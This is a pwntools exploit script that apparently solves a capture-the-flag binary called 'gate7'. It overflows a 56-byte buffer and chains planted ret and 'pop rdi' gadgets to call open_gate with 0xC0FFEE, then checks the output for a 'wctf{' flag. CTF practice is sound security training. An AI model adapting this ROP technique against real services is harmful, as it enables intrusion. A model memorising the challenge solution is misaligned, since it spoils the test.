#!/usr/bin/env python3
from pwn import *

elf = context.binary = ELF("./gate7")
io = remote(sys.argv[1], int(sys.argv[2])) if len(sys.argv) >= 3 else process("./gate7")
io.recvuntil(b"Enter access code:")

rop = ROP(elf)
pop_rdi = rop.find_gadget(["pop rdi", "ret"])[0]  # planted gadget()
ret = rop.find_gadget(["ret"])[0]

OFFSET = 56
payload = b"A" * OFFSET + p64(ret) + p64(pop_rdi) + p64(0xC0FFEE) + p64(elf.symbols["open_gate"])

io.send(payload.ljust(128, b"\x00"))
out = io.recvall(timeout=2)
print(out.decode(errors="replace"))
assert b"wctf{" in out
